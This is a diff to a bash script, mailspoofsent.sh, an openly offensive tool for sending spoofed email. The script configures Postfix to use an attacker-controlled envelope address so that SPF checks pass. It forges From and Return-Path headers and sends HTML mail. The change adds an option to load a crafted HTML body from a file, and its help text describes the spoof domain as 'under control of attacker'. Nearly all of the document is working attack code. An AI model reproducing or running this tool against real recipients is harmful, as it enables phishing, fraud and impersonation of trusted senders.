@@ -29,23 +29,23 @@ if ! dpkg -s postfix &> /dev/null; then
     fi
   fi
   # Adding requirements for spoofing and starting Postfix
-if grep -q '^smtp.mailfrom =' /etc/postfix/main.cf; then
+  if grep -q '^smtp.mailfrom =' /etc/postfix/main.cf; then
     sudo sed -i "s/^smtp.mailfrom =.*/smtp.mailfrom = $mail_envelope/" /etc/postfix/main.cf
-else
+  else
     sudo sh -c "echo 'smtp.mailfrom = $mail_envelope' >> /etc/postfix/main.cf"
-fi
+  fi
 
-if grep -q '^header.from =' /etc/postfix/main.cf; then
+  if grep -q '^header.from =' /etc/postfix/main.cf; then
     sudo sed -i "s/^header.from =.*/header.from = $mail_from/" /etc/postfix/main.cf
-else
+  else
     sudo sh -c "echo 'header.from = $mail_from' >> /etc/postfix/main.cf"
-fi
+  fi
   sudo systemctl start postfix
 fi
 
 # show usage if no arguments are provided
 if [ $# -eq 0 ]; then
-  echo "Usage: ./mailspoofsent.sh --mail-from mail_from --mail-envelope mail_envelope --mail-to mail_to --subject subject --body body [--bcc bcc_address] --spoof-domain spoof_domain"
+  echo "Usage: ./mailspoofsent.sh --mail-from mail_from --mail-envelope mail_envelope --mail-to mail_to --subject subject --body body [--bcc bcc_address] [--htmlbody body.html] --spoof-domain spoof_domain"
   exit
 fi
 
@@ -54,7 +54,7 @@ while [[ $# -gt 0 ]]; do
   key="$1"
   case $key in
     -h|--help)
-      echo "Usage: ./mailspoofsent.sh [--bcc bcc_address] --mail-from mail_from --mail-to mail_to --mail-envelope mail_envelope --subject subject --body body [--spoof-domain domain]"
+      echo "Usage: ./mailspoofsent.sh [--bcc bcc_address] --mail-from mail_from --mail-to mail_to --mail-envelope mail_envelope --subject subject --body body [--htmlbody body.html] --spoof-domain domain"
       echo ""
       echo "Options:"
       echo "  --bcc bcc_address   Specify a bcc address for the email"
@@ -63,6 +63,7 @@ while [[ $# -gt 0 ]]; do
       echo "  --mail-envelope     The under control mail address to spoof e.g. SPF"
       echo "  --subject           The subject of the email"
       echo "  --body              The body of the email"
+      echo "  --htmlbody          The HTML body of the email (provide file path)"
       echo "  --spoof-domain      The domain to spoof from under control of attacker"
       exit
       ;;
@@ -93,6 +94,11 @@ while [[ $# -gt 0 ]]; do
       ;;
     --body)
       body="$2"
+      shift
+      shift
+      ;;
+    --htmlbody)
+      html_body="$2"
       shift
       shift
       ;;
@@ -153,7 +159,7 @@ fi
 echo "[+] Setting smtp.mailfrom address to mail_envelope value to bypass SPF..."
 sudo sed -i "s/^smtp.mailfrom =.*/smtp.mailfrom = $mail_envelope/" /etc/postfix/main.cf
 sudo sed -i "s/^header.from =.*/header.from = $mail_from/" /etc/postfix/main.cf
-echo "[+] Appling changes to postfix configuration..."
+echo "[+] Applying changes to postfix configuration..."
 sudo service postfix restart
 
 # Cleaning up
@@ -164,10 +170,30 @@ sed -i '/header.from/d' /etc/postfix/main.cf
 # send the email using the mail command
 echo "[+] Sending email..."
 if [ -z "$bcc_address" ]; then
-  body="<html>$body</html>"
+  if [ -z "$html_body" ]; then
+    body="<html>$body</html>"
+  else
+    if [ -f "$html_body" ]; then
+      body=$(cat "$html_body")
+    else
+      echo "Error: HTML body file not found"
+      exit 1
+    fi
+  fi
+
   mail -s "$subject" -a "From: $mail_from" -a "Content-Type: text/html;" -a "Return-Path: $mail_envelope" "$mail_headers" "$mail_to" <<< "$body"
 else
-  body="<html>$body</html>"
+  if [ -z "$html_body" ]; then
+    body="<html>$body</html>"
+  else
+    if [ -f "$html_body" ]; then
+      body=$(cat "$html_body")
+    else
+      echo "Error: HTML body file not found"
+      exit 1
+    fi
+  fi
+
   mail -s "$subject" -a "From: $mail_from" -a "BCC: $bcc_address" -a "Content-Type: text/html;" -a "Return-Path: $mail_envelope" "$mail_headers" "$mail_to" <<< "$body"
 fi
 
